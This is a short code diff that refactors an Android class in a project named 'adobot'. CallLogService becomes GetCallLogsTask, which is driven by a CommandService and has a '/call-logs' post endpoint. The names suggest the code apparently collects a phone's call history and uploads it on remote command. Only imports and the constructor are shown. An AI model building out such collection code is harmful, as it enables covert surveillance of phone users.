@@ -1,7 +1,6 @@
-package com.android.adobot;
+package com.android.adobot.tasks;
 
 import android.Manifest;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -9,24 +8,24 @@ import android.provider.CallLog;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
+import com.android.adobot.CommandService;
+import com.android.adobot.CommonParams;
+
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashMap;
 
-import http.Http;
+import com.android.adobot.http.Http;
 
-import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
-import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
+public class GetCallLogsTask extends BaseTask {
 
-public class CallLogService extends BaseService{
-
-    private static String TAG = "CallLogService";
+    private static String TAG = "GetCallLogsTask";
 
     private static final String POSTURL = "/call-logs";
     private CommonParams commonParams;
     private int numlogs;
 
-    public CallLogService(Client client, int numlogs) {
+    public GetCallLogsTask(CommandService client, int numlogs) {
         setContext(client);
         this.numlogs = numlogs;
         this.commonParams = new CommonParams(client);
